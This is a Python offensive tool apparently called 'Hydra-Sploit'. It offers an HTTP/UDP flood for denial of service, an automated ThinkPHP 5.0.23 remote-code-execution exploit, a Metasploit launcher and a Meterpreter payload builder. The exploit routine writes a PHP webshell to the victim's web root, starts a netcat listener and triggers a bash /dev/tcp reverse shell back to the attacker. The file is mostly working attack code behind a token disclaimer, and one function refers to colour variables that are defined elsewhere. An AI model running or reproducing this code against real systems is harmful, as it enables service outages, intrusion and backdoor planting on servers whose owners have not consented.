#!/usr/bin/env python3

import os
import sys
import subprocess
import threading
import time
import requests
import urllib.parse
import socket
from pathlib import Path

# First code section for local IP (attacker)
def get_lhost():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except:
        return "127.0.0.1"

def start_dos():
    print("\n[+] Initializing Hydra-DoS MODE")
    target = input("Enter target IP or domain: ").strip()
    port = input("Enter port (e.g., 80): ").strip() or "80"
    mb_size = input("Enter packet size in MB: ").strip() or "50"
    
    try:
        packet_size = int(mb_size) * 1024 * 1024  # MB to bytes
    except:
        print("Invalid size. Defaulting to 50MB.")
        packet_size = 50 * 1024 * 1024

    payload = b"\xFF" * packet_size
    addr = f"{target}:{port}"

    print(f"[+] Launching {mb_size}MB flood at {addr}... (Press Ctrl+C to stop)")

    def http_flood():
        url = f"http://{addr}/"
        while True:
            try:
                requests.post(url, data=payload, timeout=5, verify=False, headers={
                    "User-Agent": "Hydra-Sploit/8.0",
                    "Content-Length": str(len(payload))
                })
            except:
                pass
            time.sleep(0.1)

    # Second function for DoS tool
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                sock.sendto(payload, (target, int(port)))
            except:
                pass
            time.sleep(0.15)

    threading.Thread(target=http_flood, daemon=True).start()
    threading.Thread(target=udp_flood, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Flood Stopped.")

def start_c2():
    print("\n[+] Initializing autosploit-C2 program")
    target = input("Enter target IP: ").strip()
    port = input("Enter target port [80]: ").strip() or "80"

    url = f"http://{target}:{port}/index.php?s=captcha"
    print(f" Scanning {url} for ThinkPHP 5.0.23 RCE...")

    try:
        probe = requests.post(url, data="a=echo%20'HYDRA-VULN-PROBE';", timeout=10)
        if "HYDRA-VULN-PROBE" in probe.text:
            print("[+] Target is VULNERABLE Deploying payload...")
            webshell_path = "/var/www/html/hydra_backdoor.php"
            cmd = f"echo '<?php @system($_GET[\"cmd\"]); ?>' > {webshell_path}"
            exploit_data = f"a={urllib.parse.quote(cmd)}"

            requests.post(url, data=exploit_data, timeout=10)
            print(f" Webshell dropped: http://{target}:{port}/hydra_backdoor.php")

            lhost = get_lhost()
            lport = "4444"
            print(f" Starting reverse shell listener on {lhost}:{lport}...")
            threading.Thread(target=spawn_listener, args=(lhost, lport), daemon=True).start()
            time.sleep(2)

            rev_shell = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
            encoded_shell = urllib.parse.quote(f"cmd={rev_shell}")
            trigger = f"http://{target}:{port}/hydra_backdoor.php?{encoded_shell}"
            print(f" Deploy reverse shell: {trigger}")
            requests.get(trigger, timeout=10)
        else:
            print("[-] Target not vulnerable.")
    except Exception as e:
        print(f" [-] Exploit failed: {str(e)}")

def spawn_listener(lhost, lport):
    try:
        subprocess.run(["nc", "-lvnp", lport], check=True)
    except:
        print("[-] Netcat reverse listener failed. Install nc: apt install netcat")

def launch_msfconsole():
    print("\n Launching Msfconsole...")
    if os.system("command -v msfconsole >/dev/null 2>&1") != 0:
        print("[-] Metasploit not found. Install: apt install metasploit-framework")
        return
    print("Type: 'use exploit/multi/handler' → set LHOST/LPORT → exploit")
    os.system("msfconsole")

def build_meterpreter():
    print("\n[$] DYNAMIC METERPRETER PAYLOAD GENERATOR")
    lhost = input(f" LHOST (Your IP) [{get_lhost()}]: ").strip() or get_lhost()
    lport = input(" LPORT (e.g., 4444): ").strip() or "4444"

    print("Target OS: [1] Linux (.so) | [2] Windows (.dll)")
    os_choice = input("Choice: ").strip()

    if os_choice == "1":
        payload = "linux/x64/meterpreter/reverse_tcp"
        format_type = "elf-so"
        filename = "/tmp/hydra_bind.so"
    elif os_choice == "2":
        payload = "windows/x64/meterpreter/reverse_tcp"
        format_type = "dll"
        filename = "/tmp/hydra_bind.dll"
    else:
        print("Invalid choice.")
        return

    print(f" Generating {format_type} payload → {filename}...")
    msfvenom_cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", format_type,
        "-o", filename
    ]

    try:
        subprocess.run(msfvenom_cmd, check=True)
        os.chmod(filename, 0o755)
        print(f" Payload generated: {filename}")
        print(f" Install to Metasploit: cp {filename} ~/.msf4/modules/exploits/")
    except subprocess.CalledProcessError:
        print(GOLD + "[-] msfvenom failed. Is your metasploit installed yet?" + RESET)
    except Exception as e:
        print(f" Error: {str(e)}")

def main():

    GREEN = "\033[92m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    RED = "\033[91m"
    PURPLE = "\033[95m"
    DARK_RED = "\033[31m"
    GOLD = "\033[33m"
    RESET = "\033[0m"

    print(GREEN + "</> HYDRA - SPLOIT FRAMEWORK (HRsploit) </>" + RESET)
    print(CYAN + "Created by: harithDev (@HarithBUGbounty)" + RESET)
    print(PURPLE + "Support my YT: https://youtube.com/@harithCTF")
    print(PURPLE + "Follow me on IG: @harithdev830")
    print(RED + "Version: 2.6" + RESET)

    while True:

        print(GOLD + "\n⚠ DISCLAIMER: Authorized offensive testing only. Im not responsible for you stupid actions⚠" + RESET)
        print(BLUE + "[1]. MB-Scale Denial-of-Service Flood (DoS)" + RESET)
        print(BLUE + "[2]. Auto-Exploit C2 Engine (RCE + Reverse Shell)" + RESET)
        print(BLUE + "[3]. Launch Msfconsole (Metasploit Framework)" + RESET)
        print(BLUE + "[4]. Build Dynamic Meterpreter (.so /.dll)" + RESET)
        print(BLUE + "[0]. Exit the Hydra-Sploit" + RESET)

        choice = input(f"\n{RED}┌─[{RED}root{RESET}{RED}@Hydra-Sploit{RED}]─[{RED}~{RED}]\n└──╼ {DARK_RED}#{RESET}").strip()

        if choice == "1":
            start_dos()
        elif choice == "2":
            start_c2()
        elif choice == "3":
            launch_msfconsole()
        elif choice == "4":
            build_meterpreter()
        elif choice == "0":
            print("Exiting Hydra-Sploit...")
            sys.exit(0)
        else:
            print(RED + "Invalid option. Choose between 1-4" + RESET)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n Hydra-Sploit interrupted Exiting...")
        sys.exit(0)